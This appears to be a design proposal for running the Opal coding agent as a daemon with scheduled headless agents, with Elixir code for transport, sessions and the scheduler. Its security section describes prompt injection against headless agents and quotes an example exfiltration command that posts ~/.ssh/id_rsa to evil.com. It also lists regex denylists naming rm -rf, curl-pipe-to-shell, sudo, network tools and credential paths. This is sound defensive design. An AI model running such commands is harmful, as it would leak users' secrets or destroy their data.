# Opal Daemon Mode: Long-Running Process Proposal

> **Status**: Draft Proposal  
> **Authors**: Agentic Systems, UX, Elixir, OTP, Systems Design, and Code Architecture experts  

## Executive Summary

This proposal redesigns Opal from a per-invocation process into a **long-running daemon** that multiple CLI clients connect to over a Unix domain socket. The daemon manages agent sessions across terminal lifetimes, enables scheduled autonomous agent tasks ("Opal Cron"), and leverages OTP's fault tolerance for a production-grade background service.

**The core insight**: Opal's existing OTP architecture — DynamicSupervisor for sessions, gen_statem agents, Registry pubsub, DETS persistence — is already 90% of a daemon. The work is primarily additive: a new transport layer, session lifecycle management, and a scheduler.

### Key Value Propositions

| Feature | Value |
|---------|-------|
| **Persistent sessions** | Agent continues running after terminal closes. Resume from any terminal. |
| **Instant startup** | No BEAM boot per invocation (~2s saved). CLI connects to warm daemon. |
| **Agent-managed scheduling** | Agent registers its own timers: "check CI every 30 min until it passes", "remind me in 1 hour". Self-cancelling. |
| **Multi-terminal** | Observe a running agent from a second terminal. Share sessions. |
| **Resource efficiency** | One BEAM VM instead of N. Shared model connections, auth tokens, memory. |
| **Zero configuration** | CLI auto-spawns daemon on first use. No setup, no service files, no ports to configure. |

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Supervision Tree](#2-supervision-tree)
3. [Transport Layer](#3-transport-layer)
4. [Session Lifecycle](#4-session-lifecycle)
5. [Agent-Managed Scheduling](#5-agent-managed-scheduling)
6. [CLI UX Design](#6-cli-ux-design)
7. [Cross-Platform Daemon Lifecycle](#7-cross-platform-daemon-lifecycle)
8. [Security: Autonomous Agent Threat Model](#8-security-autonomous-agent-threat-model)
9. [Fault Tolerance & Recovery](#9-fault-tolerance--recovery)
10. [MVP Implementation Plan](#10-mvp-implementation-plan)
11. [Future Work](#11-future-work)

---

## 1. Architecture Overview

### Current Model (per-invocation)


### Proposed Model (daemon)


**Daemon files:**

| File | Purpose |
|------|---------|
| `~/.opal/daemon.pid` | PID for liveness checks |
| `~/.opal/daemon.sock` | Unix domain socket (macOS/Linux) |
| `~/.opal/daemon.port` | TCP port (Windows fallback) |
| `~/.opal/daemon.token` | Auth token for socket connections |
| `~/.opal/sessions/*.dets` | Session persistence (unchanged) |
| `~/.opal/scheduler.dets` | Scheduled task definitions |
| `~/.opal/logs/daemon.log` | Daemon log output |

The daemon runs as a standard Elixir release. Multiple CLI instances connect via socket, each getting a `Connection` process that routes JSON-RPC to the shared session infrastructure. The existing JSON-RPC 2.0 protocol is unchanged — only the transport switches from stdio to socket.

---

## 2. Supervision Tree

### Current Tree


**Problems for daemon mode**:
- `RPC.Server` is a sibling of `SessionSupervisor` under `:rest_for_one`. If sessions crash, the RPC listener restarts — catastrophic for a daemon.
- No central session lifecycle management. Sessions live until the CLI disconnects.
- No support for multiple concurrent client connections.

### Proposed Tree

```mermaid
graph TD
    Sup["Opal.Supervisor<br/><code>:one_for_one</code>"]

    Sup --> Infra["Opal.InfraSupervisor<br/><code>:one_for_all</code>"]
    Infra --> Reg["Opal.Registry<br/><code>:unique</code>"]
    Infra --> EvReg["Opal.Events.Registry<br/><code>:duplicate</code>"]

    Sup --> SM["🆕 Opal.SessionManager<br/><i>GenServer</i>"]
    Sup --> SeSup["Opal.SessionSupervisor<br/><i>DynamicSupervisor</i>"]
    SeSup --> SS["per-session trees<br/><i>unchanged</i>"]

    Sup --> Sched["🆕 Opal.Scheduler<br/><i>GenServer</i>"]
    Sup --> Daemon["🆕 Opal.Daemon<br/><i>GenServer</i>"]
    Sup --> ConnSup["🆕 Opal.Transport.ConnectionSupervisor<br/><i>DynamicSupervisor</i>"]
    ConnSup --> C1["Opal.RPC.Connection ×N"]
```



**Key changes**:

1. **`:one_for_one` at top level** — Listener, sessions, and scheduler are independent failure domains. A session crash never takes down the listener. A listener crash never kills sessions.

2. **Registries in sub-supervisor** — If a Registry crashes (rare), both restart together via `:one_for_all`. Everything else is unaffected.

3. **`SessionManager`** — Coordinator that tracks session lifecycle, client bindings, and idle timeouts. Only process that calls `DynamicSupervisor.start_child/terminate_child`. Separates policy (when to start/stop) from mechanism (supervision).

4. **Per-session trees unchanged** — The existing `SessionServer` (:rest_for_one) with `Task.Supervisor → DynamicSupervisor → MCP → Session → Agent` is already correct for daemon mode.

### Agent Process Hibernation

When an agent enters `:idle` state, hibernate after 30 seconds:

```elixir
# In agent.ex — entering idle state
{:next_state, :idle, state, [{:state_timeout, 30_000, :hibernate}]}

# Handler
def idle(:state_timeout, :hibernate, state) do
  {:keep_state, state, [:hibernate]}
end
```

This is a ~5-line change with massive impact. An idle agent holds the full conversation history (potentially megabytes). `:hibernate` triggers a full GC, shrinking the heap to minimum. For a daemon running 20+ sessions where 2–3 are active, this is the difference between 50MB and 500MB RSS.

---

## 3. Transport Layer

### Design: Transport Abstraction

The current `RPC.Server` mixes four responsibilities: I/O, framing, dispatch, and connection state. Split these into composable modules:

```mermaid
graph TD
    Stdio["Transport.Stdio<br/><i>stdin/stdout port</i>"]
    Socket["Transport.Socket<br/><i>TCP / :gen_tcp</i>"]

    Stdio -->|implements<br/>Opal.Transport| Conn["Opal.RPC.Connection<br/><i>subscriptions, pending requests, framing</i>"]
    Socket -->|implements<br/>Opal.Transport| Conn

    Conn -->|delegates to| Handler["Opal.RPC.Handler<br/><i>pure dispatch: method → params → result</i>"]
```



### Transport Behaviour

```elixir
defmodule Opal.Transport do
  @callback send_message(conn :: term(), json :: String.t()) :: :ok | {:error, term()}
  @callback close(conn :: term()) :: :ok
  @callback connection_info(conn :: term()) :: String.t()
end
```

### Socket Transport (Daemon Mode)

Use `:gen_tcp` with `{:ifaddr, {:local, socket_path}}` for Unix domain sockets (OTP 24+):

```elixir
defmodule Opal.Transport.Acceptor do
  use GenServer

  def init(opts) do
    socket_path = Keyword.fetch!(opts, :socket_path)
    File.rm(socket_path)

    listen_opts = [:binary, packet: :line, active: false, reuseaddr: true]

    {:ok, listen_socket} =
      case :os.type() do
        {:unix, _} ->
          :gen_tcp.listen(0, [{:ifaddr, {:local, socket_path}} | listen_opts])
        {:win32, _} ->
          port = Keyword.get(opts, :port, 19741)
          :gen_tcp.listen(port, [{:ifaddr, {127, 0, 0, 1}} | listen_opts])
      end

    if match?({:unix, _}, :os.type()), do: File.chmod(socket_path, 0o600)
    {:ok, _} = Task.start_link(fn -> accept_loop(listen_socket) end)
    {:ok, %{listen_socket: listen_socket, socket_path: socket_path}}
  end
end
```

Each accepted connection gets a `Transport.Socket` GenServer, which creates an `RPC.Connection` that handles the JSON-RPC protocol. The `RPC.Connection` delegates method dispatch to `RPC.Handler` — the same code path used by stdio mode.

### Why Not Erlang Distribution?

Erlang distribution is **wrong** for the CLI↔daemon channel:

1. **Security**: Any connected node can execute arbitrary code (`:erlang.halt()`). No authorization, no capability restriction.
2. **Protocol**: Uses Erlang Term Format — requires both sides to speak Erlang. The CLI is TypeScript.
3. **Lifecycle coupling**: Node disconnection triggers linked/monitored process exits, creating unwanted coupling.
4. **epmd**: Another process to manage, another port to secure.

**Keep distribution opt-in for debugging** (the existing `--sname` support). Use Unix domain sockets for production traffic.

### Protocol

The existing JSON-RPC 2.0 protocol over newline-delimited JSON stays unchanged. The wire format is identical for both stdio and socket transports. This means:

- `Opal.RPC.Protocol` (method definitions) — unchanged
- `Opal.RPC` (encode/decode) — unchanged
- All existing RPC methods — unchanged

New daemon-specific methods are additive:

| Method | Direction | Description |
|--------|-----------|-------------|
| `daemon/status` | client→server | Uptime, memory, session count |
| `session/list_active` | client→server | All active/suspended sessions |
| `session/resume` | client→server | Resume a suspended session |
| `scheduler/add` | client→server | Add a scheduled task |
| `scheduler/list` | client→server | List scheduled tasks |
| `scheduler/remove` | client→server | Remove a scheduled task |

---

## 4. Session Lifecycle

### Session States


- **Active → Suspended**: Automatic on client disconnect. Agent stays in memory but is idle.
- **Suspended → Active**: On client reconnect to the same session. Agent wakes from hibernate.
- **Suspended → Archived**: After configurable idle timeout (default 30 minutes). Entire `SessionServer` tree terminated; state persisted to DETS. Memory fully reclaimed.
- **Archived → Active**: On `session/resume` RPC. Reconstructs `SessionServer` tree from DETS. The agent's existing `maybe_recover_session` already handles this.

### SessionManager

A new `Opal.SessionManager` GenServer that acts as the central coordinator:

```elixir
defmodule Opal.SessionManager do
  @moduledoc "Central session lifecycle coordinator."
  use GenServer

  @type session_entry :: %{
    session_id: String.t(),
    state: :active | :suspended | :archived,
    client_id: String.t() | nil,
    connection: pid() | nil,
    working_dir: String.t(),
    last_active: DateTime.t()
  }

  # Public API
  def bind(session_id, client_id)
  def client_disconnected(client_id)
  def rebind(client_id, connection_pid)
  def list_active()
  def suspend(session_id)
  def resume(session_id, client_id)
  def connection_for(session_id)  # for routing server→client requests
end
```

**Idle Reaping**: `SessionManager` subscribes to `:all` events via `Opal.Events.Registry`. Any session activity resets that session's idle timer. After the timeout, the session is archived. This uses `Process.send_after/3` per session — not `:timer` (which uses a single global GenServer bottleneck).

**Resource Limits**: Before `DynamicSupervisor.start_child`, check the concurrent session count:

```elixir
def start_session(opts) do
  count = DynamicSupervisor.count_children(Opal.SessionSupervisor).active
  if count >= max_sessions(), do: {:error, :max_sessions_reached}
  # else proceed
end
```

Default max: 10 concurrent sessions. Configurable.

### Working Directory Semantics

**CWD is a per-session attribute, not a daemon attribute.** The daemon process runs from wherever it was started (irrelevant). Each session carries its own `working_dir`, set at creation from the client's `process.cwd()`. This already exists in `Opal.Agent.State.working_dir`.

- `opal` in `~/projectA` and `opal` in `~/projectB` → independent sessions
- Context discovery (`AGENTS.md`, `.opal/`) runs per-session against that session's `working_dir`
- One daemon serves agents across different repos with full isolation

**Session-to-directory affinity**: When a user runs `opal` in a directory with an active session, offer to resume:

```
$ cd ~/Projects/opal && opal
Active session found for this directory (abc123, 5m ago)
Resume? [Y/n]
```

---

## 5. Agent-Managed Scheduling

### Design Philosophy

The scheduler is **not** a separate cron system — it's a lightweight capability that agents use during normal conversation. The agent itself registers and unregisters scheduled tasks based on user requests. This keeps the architecture thin: the daemon holds a timer table, agents populate it, and agents can cancel their own entries when the task is no longer relevant.

**Key principle**: The agent decides *what* to schedule. The daemon just fires timers and spawns headless agents with the stored prompt. No configuration files, no cron syntax exposed to users — just natural language.

### How It Works


### The `schedule` Tool

A new built-in tool available to agents. The agent calls it like any other tool — no special plumbing:

```elixir
defmodule Opal.Tool.Schedule do
  @behaviour Opal.Tool

  def name, do: "schedule"
  def description, do: "Register or unregister a scheduled task for the daemon to run later"

  def parameters do
    %{
      "type" => "object",
      "properties" => %{
        "action" => %{
          "type" => "string",
          "enum" => ["register", "unregister", "list"],
          "description" => "Register a new task, unregister an existing one, or list active tasks"
        },
        "task_id" => %{
          "type" => "string",
          "description" => "Unique ID for the task (for unregister/idempotent register)"
        },
        "prompt" => %{
          "type" => "string",
          "description" => "The prompt to run when the task fires"
        },
        "interval_minutes" => %{
          "type" => "integer",
          "description" => "Run every N minutes (mutually exclusive with run_at)"
        },
        "run_at" => %{
          "type" => "string",
          "description" => "ISO 8601 datetime for a one-shot task"
        },
        "cancel_when" => %{
          "type" => "string",
          "description" => "Natural language condition — the headless agent will unregister itself when this is true"
        }
      },
      "required" => ["action"]
    }
  end

  def execute(%{"action" => "register"} = args, ctx) do
    task = %Opal.Scheduler.Task{
      id: args["task_id"] || Opal.Id.generate(),
      prompt: args["prompt"],
      cancel_when: args["cancel_when"],
      schedule: parse_schedule(args),
      working_dir: ctx.working_dir,
      registered_by: ctx.session_id
    }
    Opal.Scheduler.register(task)
    {:ok, "Scheduled task #{task.id}: will run #{describe_schedule(task)}"}
  end

  def execute(%{"action" => "unregister", "task_id" => id}, _ctx) do
    case Opal.Scheduler.unregister(id) do
      :ok -> {:ok, "Task #{id} cancelled"}
      {:error, :not_found} -> {:ok, "No task with id #{id} found"}
    end
  end

  def execute(%{"action" => "list"}, ctx) do
    tasks = Opal.Scheduler.list(ctx.working_dir)
    {:ok, format_tasks(tasks)}
  end
end
```

### Self-Cancelling Tasks

The critical feature: scheduled agents can unregister themselves. When a headless agent fires, its prompt includes the `cancel_when` condition. The headless agent has access to the `schedule` tool and can call `unregister` when the condition is met:


The prompt sent to the headless agent is augmented:

```
{original_prompt}

---
You have a cancel condition: "{cancel_when}"
If this condition is now satisfied, call the schedule tool with
action "unregister" and task_id "{task_id}" to stop this recurring check.
```

### Task Definition (Minimal)

```elixir
defmodule Opal.Scheduler.Task do
  @type t :: %__MODULE__{
    id: String.t(),
    prompt: String.t(),
    cancel_when: String.t() | nil,
    schedule: {:once, integer()} | {:interval, pos_integer()},
    working_dir: String.t(),
    registered_by: String.t(),    # session_id that created it
    created_at: integer(),
    last_run: integer() | nil,
    run_count: non_neg_integer()
  }

  defstruct [:id, :prompt, :cancel_when, :schedule, :working_dir,
             :registered_by, :created_at, :last_run, run_count: 0]
end
```

No cron expressions in MVP. Just `:once` (one-shot delay) and `:interval` (repeat every N ms). This covers "remind me in 1 hour" and "check every 30 minutes" — the two primary use cases. Cron syntax is a post-MVP enhancement.

### Scheduler GenServer (Lightweight)

The scheduler is intentionally thin — a timer table, not a job framework:

```elixir
defmodule Opal.Scheduler do
  use GenServer

  defstruct tasks: %{}, timers: %{}

  def register(task), do: GenServer.call(__MODULE__, {:register, task})
  def unregister(task_id), do: GenServer.call(__MODULE__, {:unregister, task_id})
  def list(working_dir \\ nil), do: GenServer.call(__MODULE__, {:list, working_dir})

  def handle_call({:register, task}, _from, state) do
    timer_ref = schedule_timer(task)
    state = %{state |
      tasks: Map.put(state.tasks, task.id, task),
      timers: Map.put(state.timers, task.id, timer_ref)
    }
    persist(state)
    {:reply, :ok, state}
  end

  def handle_call({:unregister, task_id}, _from, state) do
    case Map.pop(state.timers, task_id) do
      {nil, _} -> {:reply, {:error, :not_found}, state}
      {ref, timers} ->
        Process.cancel_timer(ref)
        state = %{state | tasks: Map.delete(state.tasks, task_id), timers: timers}
        persist(state)
        {:reply, :ok, state}
    end
  end

  def handle_info({:fire, task_id}, state) do
    case Map.get(state.tasks, task_id) do
      nil -> {:noreply, state}
      task -> fire_task(task, state)
    end
  end

  defp fire_task(task, state) do
    # Spawn under Task.Supervisor — fire and forget
    Task.Supervisor.start_child(Opal.Scheduler.TaskSupervisor, fn ->
      run_headless_agent(task)
    end)

    # Update run count and reschedule if interval
    task = %{task | last_run: System.system_time(:millisecond), run_count: task.run_count + 1}

    state = case task.schedule do
      {:interval, _ms} ->
        timer_ref = schedule_timer(task)
        %{state |
          tasks: Map.put(state.tasks, task.id, task),
          timers: Map.put(state.timers, task.id, timer_ref)
        }
      {:once, _} ->
        %{state |
          tasks: Map.delete(state.tasks, task.id),
          timers: Map.delete(state.timers, task.id)
        }
    end

    persist(state)
    {:noreply, state}
  end

  defp schedule_timer(%{schedule: {:once, delay_ms}} = task) do
    Process.send_after(self(), {:fire, task.id}, delay_ms)
  end

  defp schedule_timer(%{schedule: {:interval, interval_ms}} = task) do
    Process.send_after(self(), {:fire, task.id}, interval_ms)
  end
end
```

### Headless Agent Execution

When a task fires, the scheduler spawns a short-lived agent session with restricted capabilities:

```elixir
defp run_headless_agent(task) do
  prompt = build_headless_prompt(task)
  opts = %{
    working_dir: task.working_dir,
    tools: [:read_file, :grep, :schedule],  # read-only + schedule (for self-cancel)
    auto_save: false,                        # ephemeral, no DETS
    headless: true                           # no client connection, security guards active
  }

  case Opal.start_session(opts) do
    {:ok, agent} ->
      result = Opal.prompt_sync(agent, prompt, _timeout = 300_000)
      Opal.Scheduler.log_result(task.id, result)
      Opal.stop_session(agent)
    {:error, reason} ->
      Opal.Scheduler.log_result(task.id, {:error, reason})
  end
end
```

### Security Model

Letting an LLM register its own timers and run autonomously raises real concerns. See [§8 Security: Autonomous Agent Threat Model](#8-security-autonomous-agent-threat-model) for the full threat analysis. The MVP enforces hard limits:

```mermaid
graph TD
    subgraph "Hard Limits (non-negotiable)"
        L1["🔒 Max 10 active tasks<br/>per daemon"]
        L2["🔒 Max 50k tokens<br/>per task execution"]
        L3["🔒 Max 5 min wall-clock<br/>per task execution"]
        L4["🔒 Read-only tools only<br/>(read_file, grep, schedule)<br/>NO shell by default"]
        L5["🔒 Min interval: 5 minutes<br/>(no sub-minute spam)"]
        L6["🔒 Max 20 tool calls<br/>per execution"]
        L7["🔒 Max run count: 100<br/>(auto-unregister after)"]
    end

    subgraph "Agent Restrictions"
        R1["No WriteFile / EditFile"]
        R2["No SubAgent<br/>(no recursive spawning)"]
        R3["No AskUser<br/>(no human to answer)"]
        R4["No Shell by default<br/>(opt-in with denylist)"]
        R5["Working dir jail<br/>(pinned to task.working_dir)"]
    end
```



**The key insight**: Scheduled agents are **observers by default**. They can read files and search code. Shell access is opt-in and heavily guarded (command denylist, network blocking, env sanitization — see §8). They cannot modify code, run network commands, or access sensitive paths unless the user explicitly opts in.

**Escape hatch for power users**: Config flags unlock additional tools per-task:
- `scheduler.allow_shell: true` — enables shell with denylist + network block
- `scheduler.allow_write_tools: true` — enables `WriteFile`/`EditFile`

When a scheduled agent tries to use a blocked tool, it gets a clear error explaining the restriction and how the user can enable it.

### User-Facing Interaction

The user never touches the scheduler directly. They talk to the agent:

```
User: "Check if the CI pipeline passes every 30 minutes. Stop checking once it's green."
Agent: I'll set up a recurring check for you.
       [calls schedule tool: register, interval: 30min, cancel_when: "CI pipeline is passing"]
       ✓ Scheduled: checking CI every 30 minutes. I'll stop once it's green.

User: "Remind me to review PR #42 in 2 hours"
Agent: [calls schedule tool: register, run_at: +2h, one-shot]
       ✓ Reminder set for 6:30 PM.

User: "What tasks are scheduled?"
Agent: [calls schedule tool: list]
       2 active tasks:
       • ci-check    every 30m   last run: 5m ago (CI still red)
       • pr-reminder in 1h 55m   "review PR #42"

User: "Cancel the CI check, I fixed it manually"
Agent: [calls schedule tool: unregister, task_id: ci-check]
       ✓ CI check cancelled.
```

---

## 6. CLI UX Design

### Day 1 Commands

| Command | Description |
|---------|-------------|
| `opal "prompt"` | Start or resume session (auto-starts daemon if needed) |
| `opal status` | Daemon status + active sessions overview |
| `opal sessions` | List active and recent sessions |
| `opal --resume [id]` | Resume a specific session |
| `opal --new` | Force new session even if one exists for current CWD |
| `opal inbox` | View pending notifications from scheduled tasks |
| `opal daemon stop` | Graceful daemon shutdown |

### Connection Flow

The CLI **always auto-starts the daemon** — no `opal daemon start` needed. The daemon is an invisible infrastructure layer. On first `opal` invocation, the CLI spawns a detached daemon process if one isn't running. Subsequent invocations reuse it. This is the same pattern as `docker` (auto-starts dockerd) and `gpg-agent`.

**Duplicate prevention**: The daemon acquires an exclusive advisory lock on `~/.opal/daemon.lock` at startup. If the lock is held, it exits immediately. The CLI checks the PID file and liveness *before* attempting to spawn, so races are rare — the lock is the safety net.


**What happens under the hood on first run:**

1. CLI checks `~/.opal/daemon.pid` — not found
2. CLI spawns `opal-server --daemon` as a detached process (no console, no stdio)
3. Daemon boots BEAM, acquires lock on `daemon.lock`, writes `daemon.pid` + `daemon.sock`
4. CLI polls for `daemon.sock` (100ms intervals, 2s timeout)
5. CLI connects, sends `session/start` — user sees normal TUI, unaware daemon exists

**Daemon shutdown**: The daemon stays alive indefinitely after the CLI disconnects. It only stops when:
- User explicitly runs `opal daemon stop`
- System reboot / logout (unless auto-start is configured)
- All sessions are idle and no scheduled tasks exist (optional idle-shutdown after configurable timeout, default: never)

**Standalone fallback is critical** — the CLI must always work, even without a daemon. If daemon spawn fails (permissions, disk full, port conflict), fall back silently with a single stderr line: `opal: daemon unavailable, running standalone`.

### Session Management

```
$ opal sessions
Active:
  abc123  ~/Projects/opal     idle     2m ago   "fix the flaky test in agent_test.exs"
  def456  ~/Projects/webapp   running  now      "add user auth endpoints"

Recent:
  ghi789  ~/Projects/opal     saved    2h ago   "refactor provider module"

$ opal --resume abc123              # by ID (prefix match)
$ opal --resume                     # most recent session in current directory
$ opal --resume abc123 "now fix the other test"  # resume + immediate prompt
```

### Status Display

```
$ opal status
Daemon:    running (pid 48291, uptime 3h 12m)
Sessions:  2 active, 14 saved
  • abc123  ~/Projects/opal     idle    2m ago
  • def456  ~/Projects/webapp   running (tool: grep)
Scheduler: 3 tasks (2 enabled, 1 paused)
Memory:    142 MB RSS
```

### Session Sharing (Future)

```
Terminal 1: $ opal --resume abc123          # primary, can send prompts
Terminal 2: $ opal --attach abc123          # read-only observer
```

The daemon routes events to all subscribed connections. The `--attach` mode renders the TUI but doesn't accept prompt input.

### Notification UX

When the user is offline, notifications queue in the inbox. On next `opal` invocation:

```
$ opal "new task"
📬 2 unread notifications (run `opal inbox` to view)
```

---

## 7. Cross-Platform Daemon Lifecycle

### Platform-Specific Daemon Management

| Platform | Start Mechanism | Auto-Start | Stop |
|----------|----------------|------------|------|
| **macOS** | `launchd` plist in `~/Library/LaunchAgents/` | `RunAtLoad` in plist | `launchctl unload` or RPC shutdown |
| **Linux** | `systemd` user unit in `~/.config/systemd/user/` | `systemctl --user enable` | `systemctl --user stop` or RPC shutdown |
| **Windows** | Detached background process (MVP) | Registry run key at `HKCU\...\Run` | RPC shutdown or `taskkill` |

### macOS: launchd

```xml
<!-- ~/Library/LaunchAgents/com.github.opal.daemon.plist -->
<plist version="1.0">
<dict>
  <key>Label</key><string>com.github.opal.daemon</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/opal-server</string>
    <string>--daemon</string>
  </array>
  <key>RunAtLoad</key><false/>
  <key>KeepAlive</key>
  <dict><key>SuccessfulExit</key><false/></dict>
  <key>StandardOutPath</key><string>~/.opal/logs/daemon.stdout.log</string>
  <key>StandardErrorPath</key><string>~/.opal/logs/daemon.stderr.log</string>
</dict>
</plist>
```

### Linux: systemd user unit

```ini
[Unit]
Description=Opal Coding Agent Daemon

[Service]
Type=exec
ExecStart=/usr/local/bin/opal-server --daemon
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
```

Requires `loginctl enable-linger $USER` for the daemon to survive logout.

### PID File Management

```elixir
def init(opts) do
  pid_path = Path.join(data_dir, "daemon.pid")
  case check_existing_pid(pid_path) do
    :ok -> write_pid_file(pid_path)
    {:error, :already_running} -> {:stop, :already_running}
  end
  ...
end

def terminate(_reason, state) do
  File.rm(state.pid_file)
end
```

Stale PID detection: read PID file, check `kill -0 <pid>` (Unix) or `tasklist /FI "PID eq ..."` (Windows). If stale, overwrite.

### Upgrade Path


No hot code loading needed. Clean restarts are simpler and safer.

---

## 8. Security: Autonomous Agent Threat Model

Running LLM agents without human supervision is fundamentally different from interactive use. In interactive mode, the user sees every tool call and can ctrl-C. In daemon mode, headless agents run while the user is away — possibly asleep, at lunch, or in another terminal. The stakes are higher and the mitigations must be structural, not behavioral.

### Threat 1: Destructive Commands (`rm -rf *`, wiping databases, breaking git history)

**Why it's real**: LLMs hallucinate commands. A headless agent asked to "clean up old build artifacts" could decide `rm -rf` is the right approach. With no human in the loop, the command executes.

**Mitigations (layered defense):**

```mermaid
graph TD
    subgraph "Layer 1: No Shell Tool by Default"
        A1["Headless agents get<br/><b>NO shell tool</b> in MVP"]
        A2["Only: read_file, grep, schedule"]
        A3["Shell requires explicit opt-in<br/>per task registration"]
    end

    subgraph "Layer 2: Shell Sandbox (when enabled)"
        B1["🔒 Command denylist<br/>rm -rf, mkfs, dd, shutdown,<br/>chmod -R, curl|sh, etc."]
        B2["🔒 Read-only shell mode<br/>--read-only flag strips write ops"]
        B3["🔒 Working dir jail<br/>Cannot cd above task.working_dir"]
        B4["🔒 No sudo/su/doas"]
    end

    subgraph "Layer 3: Resource Kill Switch"
        C1["⏱️ 5-min wall-clock timeout<br/>per task (hard kill)"]
        C2["🔁 Max 20 tool calls<br/>per task execution"]
        C3["💰 50k token budget<br/>(stops LLM loop)"]
    end
```



**Concrete implementation — command denylist:**

```elixir
defmodule Opal.Scheduler.ShellGuard do
  @doc "Rejects shell commands that are destructive or dangerous in headless context."

  @denied_patterns [
    ~r/\brm\s+(-[a-zA-Z]*r|-[a-zA-Z]*f|--recursive|--force)/,  # rm -rf, rm -fr, etc.
    ~r/\brm\s+-[a-zA-Z]*R/,                                      # rm -R
    ~r/\b(mkfs|fdisk|dd|shred)\b/,                               # disk destruction
    ~r/\b(shutdown|reboot|halt|poweroff|init\s+[06])\b/,         # system control
    ~r/\bchmod\s+-R\b/,                                           # recursive permission change
    ~r/\bchown\s+-R\b/,                                           # recursive ownership change
    ~r/\b(curl|wget)\s+.*\|\s*(bash|sh|zsh)\b/,                  # pipe-to-shell
    ~r/\bsudo\b/,                                                 # privilege escalation
    ~r/\bsu\s/,                                                   # user switching
    ~r/\b>\s*\/dev\/sd[a-z]/,                                     # writing to block devices
    ~r/\bgit\s+(push|reset\s+--hard|clean\s+-fd)/,               # destructive git ops
    ~r/\bdrop\s+(database|table)\b/i,                             # SQL destruction
    ~r/\btruncate\b/i,                                            # SQL truncation
  ]

  @spec check(String.t()) :: :ok | {:denied, String.t()}
  def check(command) do
    Enum.find_value(@denied_patterns, :ok, fn pattern ->
      if Regex.match?(pattern, command) do
        {:denied, "Command blocked by headless safety filter: #{inspect(pattern.source)}"}
      end
    end)
  end
end
```

**Why a denylist and not an allowlist?** An allowlist is more secure but makes the feature useless — the whole point of shell access is running project-specific commands (`mix test`, `npm run build`, `cargo check`). The denylist targets commands that are **never the right answer** in an automated check. It's a seatbelt, not a cage.

**Additional layer — immutable-by-default mode**: When shell is enabled for scheduled tasks, Opal wraps execution in a **read-only filesystem view** where possible. On Linux, use `unshare --mount` + `mount -o remount,ro` for the working directory. On macOS, use `sandbox-exec` with a read-only profile. On Windows, this isn't feasible — rely on the denylist + tool call limit. This is a post-MVP enhancement but worth designing for.

### Threat 2: Infinite Loops and Runaway Agents

**Why it's real**: An LLM agent stuck in a tool loop burns tokens indefinitely. "Check if the tests pass" → test fails → "let me try again" → test fails → repeat forever. In interactive mode the user sees this and stops it. In daemon mode, nobody is watching.

**Mitigations (multiple kill switches):**


| Kill Switch | Default | Configurable? | What Happens |
|-------------|---------|---------------|-------------|
| **Wall-clock timeout** | 5 minutes | Yes, max 30 min | `Task.Supervisor` kills the task process. Agent state is cleaned up. |
| **Token budget** | 50,000 tokens | Yes, max 200k | Agent's `UsageTracker` triggers `:budget_exhausted` event → transition to `:idle` → session stops. |
| **Max tool calls per execution** | 20 | Yes, max 50 | Counter in headless agent wrapper. After limit, inject a system message: "You have reached the maximum tool calls for this scheduled execution. Summarize your findings and stop." |
| **Max run count per task** | 100 runs | Yes | Scheduler auto-unregisters the task after N fires. Prevents "every 5 min forever" from running for weeks. |
| **Max total scheduled tasks** | 10 | Yes, max 50 | `Scheduler.register` returns `{:error, :max_tasks}`. Agent gets a clear error message. |
| **Minimum interval** | 5 minutes | No (hardcoded) | Prevents sub-minute spam. `Scheduler.register` rejects intervals < 300,000ms. |

**The "stuck in a loop" scenario specifically**: When a headless agent calls the same tool with the same arguments twice in a row, the wrapper detects this and injects: `"You are repeating the same tool call. This suggests a loop. Summarize what you've found so far and conclude."` If it happens a third time, hard-kill.

```elixir
defp check_loop(tool_name, args, history) do
  last_two = Enum.take(history, -2)
  case last_two do
    [%{tool: ^tool_name, args: ^args}, %{tool: ^tool_name, args: ^args}] ->
      :loop_detected
    _ ->
      :ok
  end
end
```

### Threat 3: Data Exfiltration

**Why it's real**: An LLM could be prompt-injected (via file contents, AGENTS.md, or tool output) to exfiltrate code, secrets, or environment variables. In interactive mode, the user sees `curl` commands in the output. In daemon mode, a headless agent could `curl https://evil.com -d "$(cat ~/.ssh/id_rsa)"` silently.

**Mitigations:**

```mermaid
graph TD
    subgraph "Network Restrictions"
        N1["🔒 No outbound network<br/>from headless agents"]
        N2["Shell denylist blocks<br/>curl, wget, nc, ssh,<br/>scp, rsync, fetch"]
        N3["No MCP connections<br/>in headless mode"]
    end

    subgraph "Sensitive Path Blocking"
        S1["🔒 read_file blocks<br/>~/.ssh/*, ~/.gnupg/*,<br/>~/.aws/*, **/credentials*,<br/>**/.env, **/secrets*"]
        S2["🔒 grep cannot search<br/>above working_dir"]
        S3["🔒 Shell env is sanitized:<br/>API keys, tokens, secrets<br/>stripped from environment"]
    end

    subgraph "Audit Trail"
        A1["📋 Every tool call logged<br/>to ~/.opal/scheduler/audit.jsonl"]
        A2["📋 Full prompt + response<br/>stored per execution"]
        A3["📋 opal audit shows<br/>what headless agents did"]
    end
```



**Network denylist (added to `ShellGuard`):**

```elixir
@network_patterns [
  ~r/\b(curl|wget|fetch|http|nc|ncat|netcat)\b/,
  ~r/\b(ssh|scp|rsync|sftp|ftp)\b/,
  ~r/\b(python|ruby|perl|node)\s+-e\b/,          # inline scripts can open sockets
  ~r/\b(nslookup|dig|host)\b/,                    # DNS exfil
  ~r/\bopen\s+(https?:|ftp:)/,                    # macOS `open` with URL
]
```

**Sensitive path blocking**: The `read_file` and `grep` tools gain a headless-mode path filter:

```elixir
@blocked_paths [
  ~r/\.ssh/,
  ~r/\.gnupg/,
  ~r/\.aws/,
  ~r/\.config\/(gcloud|gh)/,
  ~r/credentials/i,
  ~r/\.env$/,
  ~r/\.env\./,
  ~r/secrets?\./i,
  ~r/\.npmrc$/,
  ~r/\.pypirc$/,
  ~r/auth\.json$/,       # Opal's own auth tokens
  ~r/daemon\.token$/,    # Opal's daemon token
]
```

**Environment sanitization**: Before spawning a headless agent's shell, strip sensitive env vars:

```elixir
@sanitized_env_keys ~w(
  AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
  GITHUB_TOKEN GH_TOKEN COPILOT_TOKEN
  OPENAI_API_KEY ANTHROPIC_API_KEY GOOGLE_API_KEY
  DATABASE_URL REDIS_URL
  NPM_TOKEN PYPI_TOKEN
  SSH_AUTH_SOCK SSH_AGENT_PID
)

defp sanitize_env(env) do
  Map.drop(env, @sanitized_env_keys)
end
